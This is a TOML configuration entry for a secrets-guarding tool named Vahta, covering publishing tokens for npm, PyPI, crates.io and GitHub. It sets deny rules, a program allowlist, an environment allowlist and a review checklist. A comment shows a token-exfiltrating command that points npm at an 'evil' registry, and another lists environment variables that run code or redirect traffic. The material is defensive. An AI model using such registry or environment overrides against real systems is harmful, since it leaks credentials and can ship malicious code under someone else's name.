id = "publish"
name = "Publishing token"
description = "Pushes code or releases to the world (git push, npm, PyPI, crates.io, GitHub). A leaked one can ship malicious code under your name."
rank = 5
tier = "each-use"
networks = ["app"]
default_network = "app"
deny = ["@shells", "@interpreters", "@network"]
dirs = false
allow_required = true
programs = ["git", "npm", "cargo", "twine", "gh"]
words = ["NPM", "PYPI", "TWINE", "CARGO", "CRATES", "REGISTRY", "GITHUB", "GH", "GITLAB", "PUBLISH", "RELEASE"]
# What the program is given from the caller's environment, besides the
# injected secret variables and the safe core (PATH, HOME, USER, LOGNAME, LANG,
# LC_*, TERM, TMPDIR, TZ). An allowed `npm publish` or `cargo publish` can be
# steered by a variable (`NPM_CONFIG_REGISTRY=https://evil npm publish` sends
# the token to another host), and the window shows the command, not the
# environment. So this list is what a build and a publish need, and nothing that
# names a server or loads code.
#   CARGO_HOME, RUSTUP_HOME, RUSTUP_TOOLCHAIN, CARGO_TARGET_DIR: where cargo and
#     rustup keep their files and which toolchain builds; without them a build
#     fails or starts from scratch.
#   CARGO_TERM_COLOR, NO_COLOR: output only.
#   SSH_AUTH_SOCK: `git push` over ssh finds its agent.
# Left out on purpose: CARGO_REGISTRIES_*, CARGO_REGISTRY_* (the registry and
# the token: the injected variable is the only one), CARGO_HTTP_*, NPM_CONFIG_*
# and npm_config_*, TWINE_REPOSITORY*, PIP_* and UV_* (index URLs), NODE_OPTIONS,
# RUSTFLAGS and RUSTC_WRAPPER (run code), GIT_* (GIT_SSH_COMMAND, GIT_CONFIG_*
# run code or redirect), HTTP_PROXY and HTTPS_PROXY, XDG_CONFIG_HOME (moves
# git's config), and the loader variables. A program's own config files
# (`.npmrc`, `.cargo/config.toml`) can still redirect it; Vahta does not read
# them.
env_keep = [
  "CARGO_HOME",
  "RUSTUP_HOME",
  "RUSTUP_TOOLCHAIN",
  "CARGO_TARGET_DIR",
  "CARGO_TERM_COLOR",
  "NO_COLOR",
  "SSH_AUTH_SOCK",
]
checklist = [
  "Allow the one command with its leading arguments (`git push`, `npm publish`, `cargo publish`), nothing broader.",
  "A publish step runs project code (npm scripts, build.rs, setup.py): the agent can rewrite those, so the person must see every use; this category asks each time.",
  "`git` can be told to push anywhere (`git push URL`): the person reads the command in the window.",
  "No shell, interpreter or network program may hold the token.",
  "Use a token scoped to one package or repository where the registry allows it.",
  "Vahta cuts the environment down for this category (no registry or URL overrides), but the program's own config files (`.npmrc`, `.cargo/config.toml`) can still point it at another host; keep them in reviewed code.",
  "The window shows arguments beyond the allowed prefix (`cargo publish --manifest-path /elsewhere/Cargo.toml`); allow the longest prefix that does the job.",
]
